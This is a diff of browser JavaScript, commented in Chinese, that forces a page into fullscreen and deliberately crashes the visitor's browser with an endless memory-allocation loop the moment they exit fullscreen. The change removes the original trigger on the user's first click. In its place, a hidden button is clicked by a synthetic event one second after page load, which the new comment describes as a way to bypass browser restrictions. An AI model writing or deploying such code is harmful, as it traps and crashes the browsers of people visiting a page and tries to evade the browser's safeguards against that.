@@ -1,5 +1,4 @@
 (function() {
-    // 1. 强制全屏逻辑
     function enterFullscreen() {
         var elem = document.documentElement;
         if (elem.requestFullscreen) {
@@ -13,40 +12,46 @@
         }
     }
 
-    // 用户第一次点击页面任意位置时自动进入全屏
-    var hasTriggered = false;
-    document.addEventListener('click', function handler() {
-        if (!hasTriggered) {
-            enterFullscreen();
-            hasTriggered = true;
-            document.removeEventListener('click', handler);
-        }
+    // 页面加载完成后，延迟1秒自动触发点击，绕过浏览器限制
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            // 创建一个隐藏的按钮，自动点击它来触发全屏
+            var btn = document.createElement('button');
+            btn.style.display = 'none';
+            document.body.appendChild(btn);
+            
+            btn.addEventListener('click', function() {
+                enterFullscreen();
+                document.body.removeChild(btn);
+            });
+            
+            // 模拟点击
+            var event = new MouseEvent('click', {
+                bubbles: true,
+                cancelable: true,
+                view: window
+            });
+            btn.dispatchEvent(event);
+        }, 1000);
     });
 
-    // 2. 监听全屏状态变化，退出全屏时直接崩溃
+    // 退出全屏时直接崩溃
     var wasFullscreen = false;
-
     function onFullscreenChange() {
         var isFullscreen = !!(document.fullscreenElement || 
                               document.webkitFullscreenElement || 
                               document.mozFullScreenElement || 
                               document.msFullscreenElement);
-        
         if (isFullscreen) {
             wasFullscreen = true;
         } else if (wasFullscreen) {
-            // 检测到从全屏退出，触发崩溃
             wasFullscreen = false;
-            
-            // 无限分配内存，瞬间耗尽浏览器资源导致崩溃，无任何弹窗
             var leak = [];
             while(true) {
                 leak.push(new Array(10000000).join('x'));
             }
         }
     }
-
-    // 兼容各浏览器的全屏变化事件
     document.addEventListener('fullscreenchange', onFullscreenChange);
     document.addEventListener('webkitfullscreenchange', onFullscreenChange);
     document.addEventListener('mozfullscreenchange', onFullscreenChange);
